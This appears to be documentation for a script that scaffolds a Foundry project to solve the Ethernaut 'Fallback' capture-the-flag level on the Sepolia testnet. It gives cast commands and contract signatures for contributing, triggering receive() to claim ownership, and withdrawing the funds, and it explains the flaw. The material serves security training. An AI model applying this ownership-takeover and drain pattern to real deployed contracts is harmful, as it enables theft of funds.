# setup-testnet-exploit.py — Ethernaut Exploit Generator

**Purpose:** Generate complete Foundry project for Ethernaut CTF exploit deployment on testnet.

**Size:** 3,789 bytes

## What It Does

- **Project scaffolding** — Creates Foundry project structure
- **Contract generation** — Solidity exploit contract for Fallback (Level 01)
- **Script generation** — Foundry deployment script
- **Test generation** — Foundry test with forked testnet
- **Config generation** — foundry.toml with Sepolia RPC
- **Documentation** — README with step-by-step instructions

## Target

- **CTF:** Ethernaut (OpenZeppelin)
- **Level:** Fallback (Level 01)
- **Network:** Sepolia testnet
- **Goal:** Claim ownership, drain contract

## Generated Files

```
exploits/fallback/
├── src/
│   └── FallbackExploit.sol    # Exploit contract
├── script/
│   └── Deploy.s.sol            # Deployment script
├── test/
│   └── FallbackExploit.t.sol   # Foundry tests
├── foundry.toml                # Foundry config
└── README.md                   # Instructions
```

## Usage

```bash
python tools/setup-testnet-exploit.py
cd exploits/fallback
forge build
```

## Exploit Steps

1. **Contribute** small amount (< 0.001 ETH)
2. **Send ETH** to contract → triggers `receive()` → claims ownership
3. **Withdraw** all funds as new owner

## Prerequisites

- Foundry installed (`forge --version`)
- Sepolia ETH from faucet
- Private key environment variable

## Environment Variables

```bash
export PRIVATE_KEY=your_private_key
export FALLBACK_TARGET=0x...  # Your Ethernaut instance
export ETHERSCAN_API_KEY=your_key
```

## Deployment

```bash
# Deploy exploit contract
forge script script/Deploy.s.sol --rpc-url sepolia --broadcast --verify

# Execute exploit
cast send <EXPLOIT_CONTRACT> "contribute()" --value 0.0001ether --rpc-url sepolia
cast send <FALLBACK_TARGET> "" --value 0.0001ether --rpc-url sepolia
cast send <FALLBACK_TARGET> "withdraw()" --rpc-url sepolia
```

## Testnet Faucets

- https://sepoliafaucet.com/
- https://faucet.quicknode.com/ethereum/sepolia

## Security Notes

⚠️ **Testnet only** — Never run on mainnet
⚠️ **Burner wallet** — Use dedicated testnet wallet
⚠️ **No key commits** — Never commit private keys

## Exploit Contract Logic

```solidity
// Step 1: Contribute to become participant
function contribute() external payable;

// Step 2: Send ETH → triggers receive() → claims ownership
receive() external payable;

// Step 3: Withdraw all as owner
function withdraw() external;
```

## Why This Works

The Fallback contract has a vulnerability:
- `contributions` mapping tracks contributions
- `receive()` is called on plain ETH transfers
- `receive()` sets `msg.sender` as owner if contributions > 0
- By contributing first, then sending ETH, we bypass the contribution check

## Use Cases

- Educational: Learn smart contract security
- CTF practice: Ethernaut challenges
- Testnet experimentation: Safe exploit testing

## Dependencies

- Python 3
- Foundry (forge, cast, anvil)
- Sepolia RPC endpoint
- Sepolia ETH

## Insight

"Testnet exploits are safe learning. Break it on testnet, understand the vulnerability, protect mainnet. Security through offense."
